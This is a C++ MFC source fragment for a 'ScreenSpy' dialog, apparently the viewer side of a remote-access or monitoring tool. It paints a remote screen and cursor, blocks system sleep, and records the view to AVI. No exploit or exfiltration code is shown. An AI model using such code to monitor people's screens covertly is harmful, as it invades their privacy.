void CDifScreenSpyDlg::DoPaint()
{
	if (m_bIsFirst)
	{
		DrawTipString(_T("请稍候 - 初始屏幕加载"));
		return;
	}
	if (m_bOnClose) return;

//	EnterCriticalSection(&m_cs);
	//m_clcs.lock();
	StretchBlt(m_hDC, 0, 0, rect.Width(), rect.Height(), m_hMemDC, 0, 0, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, SRCCOPY);
	//m_clcs.unlock();
//	LeaveCriticalSection(&m_cs);
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_hDC,									// handle to device context 
			(int)((float)m_RemoteCursorPos.x / m_wZoom),
			(int)((float)m_RemoteCursorPos.y / m_hZoom),
			m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
			0, 0,										// width of the icon 
			0,											// index of frame in animated cursor 
			NULL,										// handle to background brush 
			DI_NORMAL | DI_COMPAT						// icon-drawing flags 
		);

}

void CDifScreenSpyDlg::OnPaint()
{
	CPaintDC dc(this);

	if (m_bIsFirst)
	{
		DrawTipString(_T("请稍候 - 初始屏幕加载"));
		return;
	}
	if (m_bOnClose) return;

	//EnterCriticalSection(&m_cs);
	//m_clcs.lock();
	StretchBlt(m_hDC, 0, 0, rect.Width(), rect.Height(), m_hMemDC, 0, 0, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, SRCCOPY);
	//m_clcs.unlock();
//	LeaveCriticalSection(&m_cs);
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_hDC,									// handle to device context 
			(int)((float)m_RemoteCursorPos.x / m_wZoom),
			(int)((float)m_RemoteCursorPos.y / m_hZoom),
			m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
			0, 0,										// width of the icon 
			0,											// index of frame in animated cursor 
			NULL,										// handle to background brush 
			DI_NORMAL | DI_COMPAT						// icon-drawing flags 
		);
	CDialog::OnPaint();
}

void CDifScreenSpyDlg::PostNcDestroy()
{
	// TODO: Add your specialized code here and/or call the base class
	if (!m_bOnClose)
		OnCancel();
	delete this;
	CDialog::PostNcDestroy();

}

LRESULT CDifScreenSpyDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	// TODO: Add your specialized code here and/or call the base class
	if (message == WM_POWERBROADCAST && wParam == PBT_APMQUERYSUSPEND)
	{
		return BROADCAST_QUERY_DENY; // 拦截系统待机, 休眠的请求
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) != WA_INACTIVE && !HIWORD(wParam))
	{
		SetWindowPos(&wndTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) == WA_INACTIVE)
	{
		SetWindowPos(&wndNoTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}

	return CDialog::WindowProc(message, wParam, lParam);
}

void CDifScreenSpyDlg::OnTimer(UINT nIDEvent)
{

	if (!m_aviFile.IsEmpty())
	{
		LPCTSTR	lpTipsString = _T("●");

		m_aviStream.Write(m_lpScreenDIB);

		// 提示正在录像
		//SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}
	CDialog::OnTimer(nIDEvent);
}


